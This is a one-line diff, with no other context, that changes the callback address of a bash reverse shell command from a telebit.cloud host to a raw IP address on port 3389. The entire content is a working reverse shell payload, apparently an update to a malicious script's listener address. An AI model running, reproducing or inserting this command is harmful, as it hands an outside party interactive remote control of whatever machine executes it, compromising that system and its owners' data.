@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/telebit.cloud/28604 0>&1
+bash -i >& /dev/tcp/34.229.129.243/3389 0>&1
